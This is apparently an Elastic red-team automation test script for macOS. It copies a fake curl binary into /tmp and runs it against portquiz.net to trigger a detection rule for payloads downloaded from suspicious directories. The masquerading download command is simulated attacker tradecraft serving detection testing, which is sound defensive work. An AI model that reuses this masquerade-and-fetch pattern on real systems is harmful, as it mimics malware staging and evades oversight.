# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import _common


@register_code_rta(
    id="bf7645b2-d0cf-428d-a158-b1479160e60c",
    platforms=[OSType.MACOS],
    endpoint_rules=[
        RuleMetadata(
            id="8c42c8bd-c282-44ca-b308-92e4267b6244",
            name="Payload Downloaded by Process Running in Suspicious Directory",
        )
    ],
    siem_rules=[],
    techniques=["T1105"],
)
def main():
    masquerade = "/tmp/curl"
    _common.create_macos_masquerade(masquerade)

    # Execute command
    _common.log("Launching fake curl commands to download payload")
    _common.execute([masquerade, "childprocess", "curl", "-k", "http://portquiz.net/"], timeout=5, kill=True)

    # cleanup
    _common.remove_file(masquerade)
